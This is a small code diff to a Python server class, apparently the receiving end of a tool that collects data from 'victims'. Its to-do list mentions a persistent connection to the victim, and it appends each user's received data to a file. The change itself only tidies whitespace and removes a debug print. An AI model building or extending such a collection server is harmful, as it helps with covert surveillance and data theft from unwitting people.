@@ -14,7 +14,7 @@ TO-DO list:
     - Add multiple writing threads.
     - Implement persistent connection to victim (now crashes).
     - Improve socket comunication.
-    
+
 '''
 
 class Server:
@@ -49,7 +49,6 @@ class Server:
         return data
 
     def append_text(self, username, data):
-        print("writing to file in a thread")
         with open(f"rec_data/{username}_data.txt", "a") as file:
             file.write(self.parse_text(data))
 
